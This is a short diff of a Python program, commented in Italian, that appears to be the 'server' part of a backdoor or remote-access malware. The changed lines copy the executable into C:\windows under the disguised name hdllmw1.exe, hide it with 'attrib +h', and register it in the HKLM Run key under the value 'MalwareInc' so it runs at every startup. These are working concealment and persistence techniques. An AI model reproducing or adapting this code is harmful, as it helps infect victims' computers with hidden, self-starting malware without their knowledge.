@@ -27,16 +27,16 @@ class main:
                 raise SystemExit()
                 
         #copiamo il server nella directory di sistema
-        copy(dir_path, "C:\\windows\\")
+        copy(dir_path, "C:\\windows\\hdllmw1.exe")
         
         #nascondiamo il server
-        os.system("attrib +h C:\\windows\\" +file__name)
+        os.system("attrib +h C:\\windows\\hdllmw1.exe")
         
         #aggiungiamo server.exe allo startup nel regedit
                    aReg = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
            aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
            aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-           SetValueEx(aKey,"MalwareInc",0, REG_SZ, r"C:\\Windows\\" +file__name)
+           SetValueEx(aKey,"MalwareInc",0, REG_SZ, r"C:\\Windows\\hdllmw1.exe")
            CloseKey(aKey)
            CloseKey(aReg)
         
